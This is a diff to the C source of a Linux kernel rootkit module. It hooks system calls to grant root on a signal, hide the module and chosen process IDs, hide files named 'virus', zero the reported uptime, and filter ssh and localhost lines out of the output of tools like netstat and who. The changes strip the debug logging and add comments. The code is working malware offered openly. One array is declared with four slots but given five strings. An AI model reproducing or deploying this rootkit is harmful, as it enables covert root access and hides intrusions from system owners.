@@ -9,6 +9,7 @@
 
 #include "modify_syscalls.h"
 
+//Macro functions to allow us to write to protected memory
 #define DISABLE_W_PROTECTED_MEMORY \
     do { \
         preempt_disable(); \
@@ -33,8 +34,10 @@
 // this is the filename we want to hide
 // used in hacked_getdents(...)
 #define TO_HIDE "virus"
+//array used for hiding programs. Set to -1 so no program accidently hidden
 char hidePID[6] = "-1";
 
+//Getting our original
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
@@ -42,9 +45,7 @@ asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
 asmlinkage int (*original_write)(unsigned int fd, const char *buf, size_t count);
 
-
 struct list_head *module_list;
-
 
 void update_sys_calls(void **sys_call_table){
     void **modified_at_address_sysinfo = &sys_call_table[__NR_sysinfo];
@@ -98,7 +99,6 @@ asmlinkage int hacked_sysinfo(struct sysinfo *info)
 {
     original_sysinfo(info);
     info->uptime = 0;
-    pr_info("System information modified!\n");
     return 0;
 }
 
@@ -109,18 +109,14 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
     switch(sig) {
         case SIG_GIVE_ROOT:
             give_root();
-            pr_info("Root priviledge given!\n");
             break;
         case SIG_HIDE:
-            pr_info("Hiding the module!\n");
             hide();
             break;
         case SIG_UNHIDE:
-            pr_info("Unhiding the module!\n");
             unhide();
             break;
         case SIG_HIDEPID:
-            pr_info("Hiding the PID %d,\n",pid);
             sprintf(hidePID, "%d", pid);
             break;
         default:
@@ -170,22 +166,6 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
 // given a filename w/ path, replaces with just filename
 // returns string w/o path
 const char* strip_filepath(const char* filepath) {
-    // int i, replace_i;
-    // // try to find a '/'
-    // for(i = 0; i < strlen(filepath), i++) {
-    //     // get ready to copy over to the start of the string next loop
-    //     if (filepath[i] == '/') {
-    //         replace_i = 0;
-
-    //         break;   
-    //     }
-    //     // else, move everything after to the start & end with a null terminator
-    //     if (replace_i != -1) {
-
-    //     }
-    // }
-    // if we don't find one - return as per usual
-
     const char* loc = strrchr(filepath, '/');
     if (loc == NULL) {
         // there is no path - only a filename
@@ -198,7 +178,6 @@ const char* strip_filepath(const char* filepath) {
 // code heavily inspired by:
 // https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/index.html
 // NOTE: this does not append 'No such file or directory' to the end;
-// is the error code return working?
 asmlinkage int hacked_stat(const char *path, struct stat *buf) {
     const char* filename = strip_filepath(path);
     if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
@@ -221,15 +200,13 @@ asmlinkage int hacked_write(unsigned int fd, const char *buf, size_t count){
     //modify the write syscall
     //anytime ssh is to be written (like netstat) with file descriptor = 1 (to standard output or terminal), we hide it (for netstat, ss etc)
     //anytime 127.0.0.1 is to be written, dont display (this is localhost, what we use to access through ssh - or at least what shows) (for last, who, etc...)
-
-
     //use `strace` to find what words are written to standard output for each of the frequently used networking commands (who, w, netstat, ss, last)
 
     char *keyWords[4] = {":ssh", "127.0.0.1", "localhost", ":22", "(127.0.0.1)"};
     int i = 0;
 
     if (fd == 1) {
-        //spot out 'keywords'
+        //spot our 'keywords'
         //if they are here, dont write anything at all
         for(i; i < 4; i++){
             if (strstr(buf, keyWords[i]) != NULL) {
